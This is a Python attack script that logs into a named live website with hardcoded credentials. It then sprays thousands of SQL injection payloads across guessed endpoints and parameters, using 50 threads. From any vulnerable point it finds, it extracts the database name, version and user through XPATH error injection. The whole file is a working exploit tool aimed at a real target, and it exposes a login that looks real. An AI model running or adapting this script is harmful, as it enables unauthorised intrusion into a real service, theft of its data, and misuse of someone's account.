#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class CarpetBombingSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.login()
        self.vulnerabilities = []
        self.db_info = {}
        
    def login(self):
        """登录"""
        login_data = {
            'MobileNumber': '0902955198',
            'Password': 'Hieutruong@0115'
        }
        r = self.session.post(f"{self.base_url}/Account/JLogin", data=login_data, timeout=10)
        if r.status_code == 200:
            print("[+] 登录成功")
    
    def test_sqli(self, endpoint, param, payload, method='GET'):
        """测试SQL注入"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            elif method == 'POST':
                data = {param: payload}
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = time.time() - start
            elif method == 'JSON':
                data = {param: payload}
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=15)
                elapsed = time.time() - start
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            has_error = 'error' in r.text.lower() or 'sql' in r.text.lower() or 'exception' in r.text.lower()
            
            # 检查数据库关键词
            has_db_keywords = any(kw in r.text.lower() for kw in ['database', 'mysql', 'mariadb', 'information_schema'])
            
            if has_test or has_xpath or has_delay or has_error or has_db_keywords:
                result = {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'status': r.status_code,
                    'len': len(r.text),
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'has_error': has_error,
                    'has_db_keywords': has_db_keywords,
                    'response': r.text[:1000]
                }
                
                if has_xpath:
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        result['extracted'] = match.group(1)
                
                return result
        except:
            pass
        return None
    
    def extract_database(self, endpoint, param, method='GET'):
        """提取数据库"""
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
            ('SELECT @@version', 'MySQL版本'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            result = self.test_sqli(endpoint, param, payload, method)
            if result and result.get('extracted'):
                print(f"    [+] {label}: {result['extracted']}")
                self.db_info[label] = result['extracted']
                return result['extracted']
        return None
    
    def get_all_endpoints(self):
        """获取所有可能的端点"""
        endpoints = [
            # Account
            '/Account/GetUserInfo',
            '/Account/GetUser',
            '/Account/GetUserById',
            '/Account/GetCurrentUser',
            '/Account/GetUserData',
            '/Account/GetInfo',
            '/Account/GetProfile',
            '/Account/Profile',
            '/Account/UserInfo',
            '/Account/CurrentUser',
            '/Account/UserData',
            '/Account/Info',
            '/Account/UpdateProfile',
            '/Account/ChangePassword',
            '/Account/ResetPassword',
            '/Account/ForgotPassword',
            '/Account/Verify',
            '/Account/Validate',
            '/Account/Check',
            # Handle
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
            '/Handle/GetCustomer',
            '/Handle/GetWareHouse',
            '/Handle/GetProduct',
            '/Handle/GetOrder',
            '/Handle/GetInvoice',
            # API
            '/api/user',
            '/api/users',
            '/api/customer',
            '/api/customers',
            '/api/order',
            '/api/orders',
            '/api/product',
            '/api/products',
            # Admin
            '/Admin/GetUser',
            '/Admin/GetUserInfo',
            '/Admin/GetUserList',
            '/Admin/GetCustomer',
            '/Admin/GetCustomerList',
        ]
        
        return endpoints
    
    def get_all_params(self):
        """获取所有可能的参数"""
        return [
            'id', 'ID', 'Id', 'userId', 'userID', 'user_id', 'UserID', 'UserId',
            'customer_id', 'customerID', 'CustomerID', 'CustomerId',
            'order_id', 'orderID', 'OrderID',
            'product_id', 'productID', 'ProductID',
            'warehouse_id', 'warehouseID', 'WareHouseID',
            'province_id', 'provinceID', 'ProvinceID',
            'district_id', 'districtID', 'DistrictID',
            'ward_id', 'wardID', 'WardID',
            'q', 'query', 'search', 'keyword', 'Search', 'Query',
            'name', 'Name', 'email', 'Email', 'mobile', 'Mobile', 'phone', 'Phone',
            'MobileNumber', 'Password', 'Type', 'type', 'status', 'Status',
            'group_id', 'groupID', 'GroupID', 'GroupPermissionID',
            'page', 'Page', 'limit', 'Limit', 'offset', 'Offset',
            'sort', 'Sort', 'order', 'Order',
        ]
    
    def get_all_payloads(self):
        """获取所有payload"""
        return [
            ("1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--", 'EXTRACTVALUE_TEST'),
            ("1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--", 'updatexml_TEST'),
            ("1' AND SLEEP(5)--", 'SLEEP'),
            ("1' UNION SELECT 'TEST'--", 'UNION_TEST'),
            ("1' OR '1'='1", 'OR_TRUE'),
            ("1' AND '1'='1", 'AND_TRUE'),
            ("1' AND '1'='2", 'AND_FALSE'),
        ]
    
    def comprehensive_scan(self):
        """全面扫描"""
        print("="*60)
        print("地毯式SQL注入扫描")
        print("="*60)
        
        endpoints = self.get_all_endpoints()
        params = self.get_all_params()
        payloads = self.get_all_payloads()
        methods = ['GET', 'POST', 'JSON']
        
        total_tests = len(endpoints) * len(params) * len(payloads) * len(methods)
        print(f"[*] 总测试数: {total_tests}")
        print(f"[*] 开始扫描...\n")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for endpoint in endpoints:
                for param in params:
                    for payload, ptype in payloads:
                        for method in methods:
                            futures.append(executor.submit(self.test_sqli, endpoint, param, payload, method))
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 1000 == 0:
                    print(f"[*] 已完成: {completed}/{total_tests}")
                
                result = future.result()
                if result:
                    print(f"\n[!] 发现可疑注入: {result['method']} {result['endpoint']} [{result['param']}]")
                    print(f"    Payload类型: {payloads[[p[0] for p in payloads].index(result['payload'])][1]}")
                    print(f"    状态: {result['status']}, 长度: {result['len']}")
                    print(f"    TEST: {result['has_test']}, XPATH: {result['has_xpath']}, 延迟: {result['has_delay']}")
                    
                    if result.get('extracted'):
                        print(f"    [+] 提取: {result['extracted']}")
                    
                    self.vulnerabilities.append(result)
                    
                    # 尝试提取数据库
                    if result['has_xpath']:
                        self.extract_database(result['endpoint'], result['param'], result['method'])
        
        return self.vulnerabilities
    
    def run_all(self):
        """执行所有扫描"""
        vulnerabilities = self.comprehensive_scan()
        
        # 保存结果
        with open('carpet_bombing_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'vulnerabilities': vulnerabilities,
                'db_info': self.db_info,
                'summary': {
                    'total_vulns': len(vulnerabilities),
                    'with_xpath': len([v for v in vulnerabilities if v.get('has_xpath')]),
                    'with_delay': len([v for v in vulnerabilities if v.get('has_delay')]),
                }
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("扫描结果")
        print("="*60)
        print(f"发现可疑注入点: {len(vulnerabilities)}")
        print(f"XPATH错误: {len([v for v in vulnerabilities if v.get('has_xpath')])}")
        print(f"时间延迟: {len([v for v in vulnerabilities if v.get('has_delay')])}")
        print(f"数据库信息: {len(self.db_info)}")
        
        if self.db_info:
            print("\n提取的数据库信息:")
            for k, v in self.db_info.items():
                print(f"  {k}: {v}")

if __name__ == "__main__":
    scanner = CarpetBombingSQLi()
    scanner.run_all()